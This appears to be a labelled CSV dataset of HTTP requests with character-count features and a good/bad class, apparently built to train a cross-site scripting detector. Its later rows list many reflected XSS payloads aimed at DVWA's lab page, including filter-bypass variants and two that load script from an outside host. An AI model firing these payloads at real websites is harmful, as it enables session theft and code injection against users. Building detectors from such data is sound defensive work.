Method,Path,Body,Single Quotes,Double Quotes,Dashes,Braces,Spaces,Tags,Colons,Backtick,Bad Words,XSS Check,XSS Word,Class
GET,/DVWA/vulnerabilities/fi/?page=include.php,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/DVWA/vulnerabilities/upload/,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/DVWA/vulnerabilities/captcha/,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/DVWA/vulnerabilities/sqli/,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/DVWA/vulnerabilities/sqli_blind/,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/DVWA/vulnerabilities/weak_id/,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/DVWA/vulnerabilities/xss_d/,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/DVWA/vulnerabilities/xss_r/,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/DVWA/vulnerabilities/xss_s/,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/DVWA/vulnerabilities/csp/,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/DVWA/vulnerabilities/javascript/,,0,0,0,0,0,0,0,0,0,0,1,good
GET,/DVWA/security.php,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/dvwa/js/add_event_listeners.js,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/DVWA/,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/dvwa/js/add_event_listeners.js,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/blockchain-technology-revolutionizing-data-security,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/images/sft_approved_banners/sft_logo_medium.gif,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/ga.js,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/wired/fil/index.html,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/adsense/domains/caf.js,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/search/tsc.php?200=MjE3NTQyMDc4&21=NDkuMjA1Ljg2LjQ4&681=MTY5MzgzNjc5MDBmYjQ2MDEzMDE4Y2FlYzdjY2JlZGY0ODdlYjE0YTEy&crc=9106941569c97e46dfa3fec0b5e69fc344e39bd6&cv=1,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/afs/ads/i/iframe.html,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/afs/ads?adsafe=low&adtest=off&psid=9330244380&channel=cl-033%2C%2Cexp-0051%2Cauxa-control-1%2C253786&client=dp-sedo86_3ph&r=m&hl=hi&rpbu=http%3A%2F%2Fwww.filamentality.com%2Fcaf%2F%3Fses%3DY3JlPTE2OTM4MzY3OTAmdGNpZD13d3cuZmlsYW1lbnRhbGl0eS5jb202NGY1ZTVmNjIzYTJkOC45NDMxMDA4NSZ0YXNrPXNlYXJjaCZkb21haW49ZmlsYW1lbnRhbGl0eS5jb20mYV9pZD0zJnNlc3Npb249bjNqdmI2cjdGa0Zvdk1XQU13RVg%3D&type=3&uiopt=false&swp=as-drid-2952657917972896&oe=UTF-8&ie=UTF-8&fexp=21404%2C17300002%2C17301293%2C17301321%2C17301323&format=r3%7Cs&nocache=3491693836790081&num=0&output=afd_ads&domain_name=www.filamentality.com&v=3&bsl=8&pac=2&u_his=7&u_tz=330&dt=1693836790088&u_w=1450&u_h=816&biw=1434&bih=701&psw=1434&psh=999&frm=0&cl=560704565&uio=--&cont=rb-default&jsid=caf&jsv=560704565&rurl=http%3A%2F%2Fwww.filamentality.com%2Fwired%2Ffil%2Findex.html&referer=http%3A%2F%2Fwww.socialstudieshelp.com%2F&adbw=slave-1-1%3A300%2Cmaster-1%3A518,,0,0,1,0,0,0,0,0,0,0,0,good
GET,/gampad/cookie.js?domain=www.filamentality.com&client=dp-sedo86_3ph&product=SAS&callback=__sasCookie,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/adsense/domains/caf.js?pac=2,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/ad_icons/standard/publisher_icon_image/search.svg?c=%231967D2,,0,0,0,0,0,0,0,0,0,0,1,good
GET,/ad_icons/standard/publisher_icon_image/chevron.svg?c=%23ffffff,,0,0,0,0,0,0,0,0,0,0,1,good
GET,/images/sft_approved_banners/sft_logo_medium.gif,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/ga.js,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/ga.js,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/images/sft_approved_banners/sft_logo_medium.gif,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/images/sft_approved_banners/sft_logo_medium.gif,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/images/sft_approved_banners/sft_logo_medium.gif,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/ga.js,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/images/sft_approved_banners/sft_logo_medium.gif,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/images/sft_approved_banners/sft_logo_medium.gif,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/ga.js,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/images/sft_approved_banners/sft_logo_medium.gif,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/ga.js,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/images/sft_approved_banners/sft_logo_medium.gif,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/images/sft_approved_banners/sft_logo_medium.gif,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/topics/associate-degree-at-home.html,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/images/sft_approved_banners/sft_logo_medium.gif,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/ga.js,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/schedule/meeting/linkexchange/socialstudieshelp/conf/min/configv1.0.0.js,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/images/sft_approved_banners/sft_logo_medium.gif,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/js/jquery-ui.min.js,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/js/jquery-3.3.1.min.js,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/js/nicEdit.js?1,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/ajax/libs/animejs/2.0.2/anime.min.js,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/jsapi,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/embed/AMKGQFOp6xo,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/s/player/0a835141/player_ias.vflset/en_US/embed.js,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/s/player/0a835141/www-embed-player.vflset/www-embed-player.js,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/charts/loader.js,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/s/player/0a835141/player_ias.vflset/en_US/base.js,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/s/player/0a835141/player_ias.vflset/en_US/remote.js,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/pagead/id,,0,0,0,0,0,0,0,0,1,0,0,good
GET,/instream/ad_status.js,,0,0,0,0,0,0,0,0,0,0,0,good
OPTIONS,/$rpc/google.internal.waa.v1.Waa/Create,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/js/th/fVV-MN6RwrQ4B-VMAlqKh_6wLqAJCU5xhilRORsdIR0.js,,0,0,0,0,0,0,0,0,0,0,0,good
POST,/$rpc/google.internal.waa.v1.Waa/Create,"[""O43z0dpjhgX20SCx4KAo""]",0,2,0,0,0,0,0,0,0,0,0,good
GET,/cv/js/sender/v1/cast_sender.js,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/generate_204?aHPg8w,,0,0,0,0,0,0,0,0,0,0,0,good
OPTIONS,/$rpc/google.internal.waa.v1.Waa/GenerateIT,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/accounts/CheckConnection?pmpo=https%3A%2F%2Faccounts.google.com&v=-1389950449&timestamp=1693836902055,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/_/bscframe,,0,0,0,0,0,0,0,0,0,0,0,good
POST,/v3/signin/_/AccountsSignInUi/data/batchexecute?rpcids=UEkKwb&source-path=%2Fv3%2Fsignin%2Fidentifier&f.sid=6156918556682967291&bl=boq_identityfrontendauthuiserver_20230827.08_p0&hl=en-US&_reqid=71103&rt=c,f.req=%5B%5B%5B%22UEkKwb%22%2C%22%5B%5C%22S-1677533615%3A1693836901003400%5C%22%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at=ALt4Ve3ekxODHK9VvDK8-ssqz3dJ%3A1693836901127&,0,0,0,0,0,0,0,0,0,0,0,good
GET,/generate_204?5D_Zkg,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/js/nicEdit.js,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/ui/1.9.2/jquery-ui.js,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/jquery-1.8.3.js,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/js/plusone.js,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/_/scs/abc-static/_/js/k=gapi.lb.en.S9zOXUg9rrA.O/m=plusone/rt=j/sv=1/d=1/ed=1/rs=AHpOoo-AXjUK4hNAaKzui0P9Fr9nG2_yZQ/cb=gapi.loaded_0?le=scs,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/ga.js,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/index.php?id=21&f=files/Forums/JAC%20-%20Joint%20Action%20Committee,,0,0,0,0,4,0,0,0,1,0,0,good
GET,/Admin_index.php?id=21&f=files/forms,,0,0,0,0,0,0,0,0,1,0,0,good
GET,/ga.js,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/Admin_index.php?id=21&f=Business%20Circulars,,0,0,0,0,1,0,0,0,1,0,0,good
GET,/ga.js,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/Admin_index.php?id=21&f=Important%20Circulars,,0,0,0,0,1,0,0,0,1,0,0,good
GET,/ga.js,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/index.php,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/embed/AMKGQFOp6xo,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/s/player/0a835141/player_ias.vflset/en_US/embed.js,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/s/player/0a835141/www-embed-player.vflset/www-embed-player.js,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/s/player/0a835141/player_ias.vflset/en_US/base.js,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/s/player/0a835141/player_ias.vflset/en_US/remote.js,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/pagead/id,,0,0,0,0,0,0,0,0,1,0,0,good
GET,/instream/ad_status.js,,0,0,0,0,0,0,0,0,0,0,0,good
POST,/$rpc/google.internal.waa.v1.Waa/Create,"[""O43z0dpjhgX20SCx4KAo""]",0,2,0,0,0,0,0,0,0,0,0,good
GET,/js/th/fVV-MN6RwrQ4B-VMAlqKh_6wLqAJCU5xhilRORsdIR0.js,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/cv/js/sender/v1/cast_sender.js,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/generate_204?o8eWlg,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/civilIndex/,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/civilIndex/phpLogin/,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/civilIndex/phpLogin/assets/vendor/bootstrap/js/bootstrap.bundle.min.js,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/civilIndex/phpLogin/assets/vendor/aos/aos.js,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/civilIndex/phpLogin/assets/vendor/glightbox/js/glightbox.min.js,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/civilIndex/phpLogin/assets/vendor/isotope-layout/isotope.pkgd.min.js,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/civilIndex/phpLogin/assets/vendor/swiper/swiper-bundle.min.js,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/civilIndex/phpLogin/assets/vendor/php-email-form/validate.js,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/civilIndex/phpLogin/assets/js/main.js,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/civilIndex/phpLogin/assets/img/favicon.png,,0,0,0,0,0,0,0,0,0,0,1,good
GET,/maps/embed?pb=!1m18!1m12!1m3!1d248756.07885882704!2d80.20901174999999!3d13.04752545!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x3a5265ea4f7d3361%3A0x6e61a70b6863d433!2sChennai%2C%20Tamil%20Nadu!5e0!3m2!1sen!2sin!4v1666962088990!5m2!1sen!2sin,,0,0,0,0,2,0,0,0,0,0,0,good
GET,/maps/api/mapsjs/gen_204?csp_test=true,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/maps-api-v3/embed/js/54/3/init_embed.js,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/maps-api-v3/api/js/54/3/common.js,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/maps-api-v3/api/js/54/3/util.js,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/maps-api-v3/api/js/54/3/map.js,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/maps-api-v3/api/js/54/3/overlay.js,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/maps-api-v3/api/js/54/3/search_impl.js,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/maps-api-v3/api/js/54/3/onion.js,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/civilIndex/phpLogin/register.html,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/bootstrap/4.1.1/js/bootstrap.min.js,,0,0,0,0,0,0,0,0,0,0,0,good
GET,/ajax/libs/jquery/3.2.1/jquery.min.js,,0,0,0,0,0,0,0,0,0,0,0,good
POST,/civilIndex/phpLogin/register.php,username=sidd&password=12345678&email=sid%40email.com,0,0,0,0,0,0,0,0,0,0,0,good
GET,/DVWA/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,,0,0,0,1,0,4,0,0,0,0,1,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%22-prompt(8)-%22,,0,2,0,1,0,0,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name='-prompt(8)-',,2,0,0,1,0,0,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name='-eval(%22window['pro'%2B'mpt'](8)%22)-',,6,2,0,2,0,0,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%22-eval(%22window['pro'%2B'mpt'](8)%22)-%22,,4,4,0,2,0,0,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%22onclick%3dprompt(8)%3e%22@x%2ey,,0,2,0,1,0,1,0,0,0,0,1,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%22onclick%3dprompt(8)%3e%3csvg%2fonload%3dprompt(8)%3e%22@x%2ey,,0,2,0,2,0,3,0,0,0,0,2,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3cimage%2fsrc%2fonerror%3dprompt(8)%3e,,0,0,0,1,0,2,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3cimg%2fsrc%2fonerror%3dprompt(8)%3e,,0,0,0,1,0,2,0,0,0,0,1,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3cimage%20src%2fonerror%3dprompt(8)%3e,,0,0,0,1,1,2,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3cimg%20src%2fonerror%3dprompt(8)%3e,,0,0,0,1,1,2,0,0,0,0,1,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3cimage%20src%20%3dq%20onerror%3dprompt(8)%3e,,0,0,0,1,3,2,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3cimg%20src%20%3dq%20onerror%3dprompt(8)%3e,,0,0,0,1,3,2,0,0,0,0,1,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3c%2fscrip%3c%2fscript%3et%3e%3cimg%20src%20%3dq%20onerror%3dprompt(8)%3e,,0,0,0,1,3,6,0,0,0,0,2,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3csvg%20onload%3dalert(1)%3e,,0,0,0,1,1,2,0,0,0,0,1,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%22%3e%3csvg%20onload%3dalert(1)%2f%2f,,0,1,0,1,1,2,0,0,0,0,1,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%22onmouseover%3dalert(1)%2f%2f,,0,1,0,1,0,0,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%22autofocus%2fonfocus%3dalert(1)%2f%2f,,0,1,0,1,0,0,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name='-alert(1)-',,2,0,0,1,0,0,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name='-alert(1)%2f%2f,,1,0,0,1,0,0,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%5c'-alert(1)%2f%2f,,1,0,0,1,0,0,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3c%2fscript%3e%3csvg%20onload%3dalert(1)%3e,,0,0,0,1,1,4,0,0,0,0,2,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%20contenteditable%20onblur%3dalert(1)%3elose%20focus!%20,,0,0,0,1,4,2,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%20onclick%3dalert(1)%3eclick%20this!%20,,0,0,0,1,3,2,0,0,0,0,1,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%20oncopy%3dalert(1)%3ecopy%20this!%20,,0,0,0,1,3,2,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%20oncontextmenu%3dalert(1)%3eright%20click%20this!%20,,0,0,0,1,4,2,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%20oncut%3dalert(1)%3ecopy%20this!%20,,0,0,0,1,3,2,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%20ondblclick%3dalert(1)%3edouble%20click%20this!%20,,0,0,0,1,4,2,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%20ondrag%3dalert(1)%3edrag%20this!%20,,0,0,0,1,3,2,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%20contenteditable%20onfocus%3dalert(1)%3efocus%20this!%20,,0,0,0,1,4,2,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%20contenteditable%20oninput%3dalert(1)%3einput%20here!%20,,0,0,0,1,4,2,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%20contenteditable%20onkeydown%3dalert(1)%3epress%20any%20key!%20,,0,0,0,1,5,2,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%20contenteditable%20onkeypress%3dalert(1)%3epress%20any%20key!%20,,0,0,0,1,5,2,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%20contenteditable%20onkeyup%3dalert(1)%3epress%20any%20key!%20,,0,0,0,1,5,2,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%20onmousedown%3dalert(1)%3eclick%20this!%20,,0,0,0,1,3,2,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%20onmousemove%3dalert(1)%3ehover%20this!%20,,0,0,0,1,3,2,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%20onmouseout%3dalert(1)%3ehover%20this!%20,,0,0,0,1,3,2,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%20onmouseover%3dalert(1)%3ehover%20this!%20,,0,0,0,1,3,2,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%20onmouseup%3dalert(1)%3eclick%20this!%20,,0,0,0,1,3,2,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%20contenteditable%20onpaste%3dalert(1)%3epaste%20here!,,0,0,0,1,3,2,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3cscript%3ealert(1)%2f%2f%20,,0,0,0,1,1,2,0,0,0,0,1,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3cscript%3ealert(1)%3c!...,,0,0,0,1,0,3,0,0,0,0,1,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3cscript%20src%3d%2f%2fbrutelogic%2ecom%2ebr%2f1%2ejs%3e%20,,0,0,0,0,2,2,0,0,0,0,1,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3cscript%20src%3d%2f%2f3334957647%2f1%3e,,0,0,0,0,1,2,0,0,0,0,1,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3Cx%20onxxx%3dalert(1)%20,,0,0,0,1,2,1,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3c%78%20onxxx%3d1%20,,0,0,0,0,2,1,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%20%6Fnxxx%3d1%20,,0,0,0,0,2,1,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%20o%6Exxx%3d1%20,,0,0,0,0,2,1,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%20on%78xx%3d1%20,,0,0,0,0,2,1,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%20onxxx%3D1,,0,0,0,0,1,1,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3cX%20onxxx%3d1%20,,0,0,0,0,2,1,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%20OnXxx%3d1%20,,0,0,0,0,2,1,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3cX%20OnXxx%3d1%20,,0,0,0,0,2,1,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%20onxxx%3d1%20onxxx%3d1,,0,0,0,0,2,1,0,0,0,0,0,bad
